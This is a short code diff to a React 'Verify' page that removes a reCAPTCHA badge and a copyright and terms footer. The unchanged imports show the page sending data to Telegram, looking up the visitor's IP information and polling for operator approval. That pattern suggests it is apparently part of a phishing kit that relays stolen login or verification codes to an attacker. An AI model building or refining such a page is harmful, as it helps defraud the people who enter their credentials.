@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
-import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
 
@@ -437,14 +436,6 @@ export default function Verify() {
         </div>
       </div>
 
-      {/* Footer */}
-      <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
-        <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; {t.copyright} | {t.termsOfUse} | {t.privacyCookies}
-        </span>
-      </div>
-
-      <RecaptchaBadge />
     </div>
   );
 }
